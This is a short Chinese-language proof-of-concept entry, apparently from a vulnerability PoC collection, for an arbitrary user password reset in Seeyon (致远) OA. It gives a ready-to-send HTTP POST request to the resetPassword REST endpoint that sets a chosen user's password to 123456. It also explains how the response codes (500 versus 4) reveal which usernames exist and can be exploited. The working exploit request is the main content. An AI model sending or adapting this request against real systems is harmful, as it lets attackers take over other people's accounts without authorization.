﻿# 致远 OA 任意用户密码重置

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：loginName字段值需要真实存在的用户名，用户不存在时响应回显json数据字段code为500，用户真实存在且可以被利用时回显code为4。

> 漏洞特征：

> 验证脚本：HTTP

```
POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1
Content-Type: application/json
Accept-Encoding: gzip

{"loginName":"vdkjfhgigfsjd34rvsdj","password":"123456"}
```

> 响应代码特征：500

> 响应内容特征：code

> 上传文件定位：

> 验证文件来源：致远 OA 任意用户密码重置.poc
